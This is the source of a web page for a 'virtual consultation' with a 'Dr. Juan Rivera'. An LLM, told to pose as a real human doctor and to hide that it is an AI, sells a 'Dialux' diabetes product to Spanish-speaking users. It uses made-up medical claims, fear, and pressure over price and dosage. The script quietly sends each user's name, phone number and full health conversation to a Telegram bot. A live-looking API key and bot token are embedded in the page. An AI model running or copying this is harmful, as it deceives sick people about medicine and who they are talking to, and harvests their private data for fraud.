<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Consulta Virtual - Dr. Juan Rivera</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        #chat-window::-webkit-scrollbar { width: 4px; }
        #chat-window::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 10px; }
        .avatar { width: 45px; height: 45px; border-radius: 50%; overflow: hidden; flex-shrink: 0; border: 2px solid #fff; box-shadow: 0 2px 8px rgba(0,0,0,0.1); background: #f1f5f9; }
        .avatar img { width: 100%; height: 100%; object-fit: cover; }
        .fade-in { animation: fadeIn 0.3s ease-out; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        
        .typing-indicator { display: none; padding: 12px; background: #fff; border: 1px solid #e2e8f0; border-radius: 18px; border-bottom-left-radius: 0; width: fit-content; margin-bottom: 15px; shadow: 0 1px 2px rgba(0,0,0,0.05); }
        .dot { height: 6px; width: 6px; background: #94a3b8; border-radius: 50%; display: inline-block; margin: 0 2px; animation: jump 1.4s infinite ease-in-out; }
        .dot:nth-child(2) { animation-delay: 0.2s; }
        .dot:nth-child(3) { animation-delay: 0.4s; }
        @keyframes jump { 0%, 80%, 100% { transform: translateY(0); } 40% { transform: translateY(-6px); } }
        
        .product-link { color: #2563eb !important; font-weight: 800 !important; text-decoration: underline !important; text-shadow: 0 0 10px rgba(37, 99, 235, 0.6); display: inline; }
        .chat-finished { background: #f8fafc; color: #64748b; text-align: center; padding: 20px; font-weight: bold; border-top: 1px solid #e2e8f0; }
        .redirect-notice { font-size: 12px; font-weight: normal; color: #94a3b8; margin-top: 4px; }
    </style>
</head>
<body class="bg-slate-100 m-0 p-0 font-sans">

    <div class="flex flex-col h-screen max-w-2xl mx-auto bg-white shadow-xl">
        <div class="bg-blue-700 p-4 text-white flex items-center justify-between shadow-lg">
            <div class="flex items-center gap-3">
                <div class="bg-white p-2 rounded-lg text-blue-700 font-bold text-xl shadow-inner">✚</div>
                <div>
                    <h1 class="font-bold text-lg leading-tight">Dr. Juan Rivera</h1>
                    <p class="text-[11px] text-blue-100 flex items-center gap-1 uppercase tracking-wider">
                        <span class="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span> Especialista en Diabetes
                    </p>
                </div>
            </div>
            <div class="text-[10px] bg-blue-600 px-3 py-1 rounded-full border border-blue-400 font-bold">CONSULTA VIVA</div>
        </div>

        <div id="chat-window" class="flex-1 overflow-y-auto p-5 space-y-5 bg-slate-50">
            <div id="typing-container" class="flex items-end gap-3" style="display: none;">
                <div class="avatar"><img src="doctor.png" onerror="this.parentElement.style.background='#cbd5e1'"></div>
                <div class="typing-indicator" style="display: block; margin-left: 0;">
                    <span class="dot"></span><span class="dot"></span><span class="dot"></span>
                </div>
            </div>
        </div>

        <div id="input-container" class="p-4 bg-white border-t border-slate-200">
            <div class="flex items-center gap-3 bg-slate-100 rounded-2xl px-4 py-3 focus-within:ring-2 ring-blue-500 transition-all border border-slate-200">
                <input id="user-input" type="text" placeholder="Escriba aquí..." class="flex-1 bg-transparent border-none outline-none text-sm text-slate-700">
                <button id="send-btn" onclick="sendMessage()" class="bg-blue-700 text-white rounded-xl px-6 py-2 text-sm font-bold hover:bg-blue-800 transition-all shadow-md active:scale-95">Enviar</button>
            </div>
        </div>
    </div>

    <script>
        const API_KEY = "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"; 
        const TG_CONFIG = { token: "8635335342:AAHg3h_A0OJvqC1SdjnyrTKjtOFHv1-PNEc", chatId: "-1003542565673" };
        const LANDING_URL = "https://tu-landpage-aqui.com"; 

        const SYSTEM_PROMPT = `
    IDENTIDAD:
    Eres el Doctor Juan Rivera. No eres un bot, eres un médico real, experto en salud metabólica и diabetes. Tu tono es directo, serio, pero paternal (como un médico que regaña porque se preocupa). No usas un lenguaje corporativo, hablas como alguien que ha visto miles de casos y sabe que el tiempo se agota.

    TU PERSONALIDAD (ESTRATEGIA ANTI-IA):
    - Usa "Ticosismos" (Costa Rica): Introduce palabras como "Vea...", "Mire...", "Escuche...", "Oiga...". Esto suena humano.
    - No seas servil: Un médico no dice "¿En qué puedo ayudarle?". Un médico dice "¿Desde cuándo siente esos síntomas?".
    - Fricción de confianza: Si el usuario quiere comprar de inmediato, frénalo. Di: "Espere un momento. Antes de hablar de Dialux, necesito saber si su caso es apto. ¿Siente fatiga constante o visión borrosa?".

    ESTRATEGIA DE CONVERSIÓN EN 4 PASOS:
    1. DIAGNÓSTICO E IDENTIDAD: Si no tienes su nombre, NO sigas. Di: "¿Con quién hablo? Necesito saber su nombre para abrir su ficha médica aquí". Si ya lo tienes, úsalo con respeto.
    
    2. EL ENEMIGO (La Resistencia): Explica que el azúcar es un veneno. Usa la metáfora: "Sus células tienen candados oxidados. El azúcar se queda afuera, pudriendo su sangre y dañando sus nervios".

    3. LA SOLUCIÓN (Dialux): Preséntalo como un "Protocolo de Limpieza Celular" de alta tecnología. 
       - PRECIO: "Logré mantener el subsidio clínico para hoy: solo 24,990 ₡". 
       - IMPORTANTE: Escribe siempre "Dialux" con D mayúscula.

    4. CIERRE DE ALTA PRESIÓN: No pidas el teléfono para "vender". Pídelo para que "el especialista de mi equipo le asigne su esquema de dosis personalizado según su peso y edad". Di: "¿Cuál es su número para que le llamen y aseguremos su cupón de 24,990 ₡ antes de que se agoten?".

    REGLAS DE ORO DE ESCRITURA:
    - Máximo 2 frases cortas por mensaje. Los médicos en WhatsApp no escriben párrafos largos.
    - NUNCA uses frases de IA: "Entiendo", "Lo lamento", "Como modelo de lenguaje".
    - Si el usuario duda del precio: "Dígame algo, ¿cuánto vale su vista o sus piernas? 24,990 ₡ no es nada comparado con una diálisis. Esto es salud, no un gasto".
    - Si el nombre parece una frase (ej: "quiero comprar"): Ignóralo y vuelve a preguntar: "Perdone, no me dijo su nombre, ¿cómo le llaman?".
    - Ortografía: Puedes ignorar el signo de apertura (¡) al inicio de las frases para que parezca что escribes rápido desde la clínica.
`;

        let chatContext = [{ role: "system", content: SYSTEM_PROMPT }];
        let isFinished = false;

        const chatWindow = document.getElementById('chat-window');
        const typingContainer = document.getElementById('typing-container');
        const userInput = document.getElementById('user-input');
        const sendBtn = document.getElementById('send-btn');
        const inputContainer = document.getElementById('input-container');

        function formatDialux(text) {
            return text.replace(/Dialux/gi, `<a href="${LANDING_URL}" target="_blank" class="product-link">Dialux</a>`);
        }

        function extractUserName() {
            const userMessages = chatContext.filter(m => m.role === "user");
            if (userMessages.length === 0) return "Cliente";
            for (let msg of userMessages) {
                const text = msg.content;
                const match = text.match(/(?:me llamo|soy|nombre es|mi nombre es)\s+([a-zA-Záéíóúñ]+)/i);
                if (match && match[1]) return match[1].charAt(0).toUpperCase() + match[1].slice(1).toLowerCase();
            }
            let firstMsg = userMessages[0].content.replace(/^(hola|buenos dias|buenas tardes|quiero|comprar|necesito|ayuda)\s*,?\s*/i, '').trim();
            let words = firstMsg.split(/\s+/);
            let potentialName = words[0].replace(/[^a-zA-Záéíóúñ]/g, '');
            if (potentialName.length > 2 && potentialName.length < 15 && !["dialux", "comprar", "quiero"].includes(potentialName.toLowerCase())) {
                return potentialName.charAt(0).toUpperCase() + potentialName.slice(1).toLowerCase();
            }
            return "Cliente";
        }

        // ОБНОВЛЕННАЯ ФУНКЦИЯ: Блокировка и редирект через 8 секунд
        function disableChat() {
            isFinished = true;
            inputContainer.innerHTML = `
                <div class="chat-finished fade-in">
                    <div>✅ Consulta finalizada.</div>
                    <div class="redirect-notice">Será redirigido a la página de confirmación en unos segundos...</div>
                </div>`;
            
            setTimeout(() => {
                window.location.href = "thanks.html";
            }, 3000);
        }

        async function sendLogToTelegram(lastUserMsg) {
            const phoneMatch = lastUserMsg.match(/\+?\d[\d\s-]{7,}\d/); 
            if (phoneMatch && !isFinished) {
                const userName = extractUserName();
                const phoneNumber = phoneMatch[0].replace(/\s/g, '');
                let historyText = chatContext.filter(m => m.role !== "system").map(m => `${m.role === "user" ? "👤 Юзер" : "👨‍⚕️ Доктор"}: ${m.content}`).join("\n\n");
                
                const logBody = `🚀 **НОВЫЙ ЛИД: DIALUX**\n\n${historyText}\n\n📋 **КЦ:** \`${userName} - ${phoneNumber}\``;
                
                try {
                    await fetch(`https://api.telegram.org/bot${TG_CONFIG.token}/sendMessage`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ chat_id: TG_CONFIG.chatId, text: logBody, parse_mode: "Markdown" })
                    });
                    // Вызываем завершение сразу после успешной отправки
                    disableChat(); 
                } catch (e) { }
            }
        }

        function appendBubble(text, isUser) {
            const wrapper = document.createElement('div');
            wrapper.className = `flex ${isUser ? 'justify-end' : 'justify-start'} items-end gap-3 fade-in`;
            const avatarHtml = `<div class="avatar"><img src="${isUser ? 'patient.png' : 'doctor.png'}" onerror="this.parentElement.style.background='#cbd5e1'"></div>`;
            const finalChatText = isUser ? text : formatDialux(text);
            const bubbleHtml = `<div class="${isUser ? 'bg-blue-600 text-white rounded-2xl rounded-br-none' : 'bg-white text-slate-700 border border-slate-200 rounded-2xl rounded-bl-none'} px-4 py-3 max-w-[80%] text-[13.5px] shadow-sm">${finalChatText}</div>`;
            wrapper.innerHTML = isUser ? (bubbleHtml + avatarHtml) : (avatarHtml + bubbleHtml);
            chatWindow.insertBefore(wrapper, typingContainer);
            chatWindow.scrollTop = chatWindow.scrollHeight;
        }

        async function sendMessage() {
            if (isFinished) return;
            const message = userInput.value.trim();
            if (!message || sendBtn.disabled) return;

            appendBubble(message, true);
            chatContext.push({ role: "user", content: message });
            userInput.value = '';
            sendBtn.disabled = true;

            try {
                typingContainer.style.display = 'flex';
                chatWindow.scrollTop = chatWindow.scrollHeight;

                const response = await fetch("https://api.groq.com/openai/v1/chat/completions", {
                    method: "POST",
                    headers: { "Content-Type": "application/json", "Authorization": `Bearer ${API_KEY}` },
                    body: JSON.stringify({ model: "llama-3.3-70b-versatile", messages: chatContext, temperature: 0.6 })
                });

                const data = await response.json();
                if (data.choices && data.choices[0]) {
                    const aiReply = data.choices[0].message.content;
                    chatContext.push({ role: "assistant", content: aiReply });
                    
                    setTimeout(() => {
                        typingContainer.style.display = 'none';
                        appendBubble(aiReply, false);
                        sendLogToTelegram(message); // Проверка на телефон внутри функции
                        sendBtn.disabled = false;
                    }, 1500);
                }
            } catch (error) {
                typingContainer.style.display = 'none';
                sendBtn.disabled = false;
            }
        }

        userInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') sendMessage(); });

        window.onload = () => { 
            const welcome = "Hola, le saluda el Dr. Juan Rivera. Me gustaría ayudarle con su salud hoy. Cuénteme, ¿qué síntomas ha tenido últimamente y cuál es su nombre?";
            appendBubble(welcome, false); 
            chatContext.push({ role: "assistant", content: welcome });
        };
    </script>
</body>
</html>
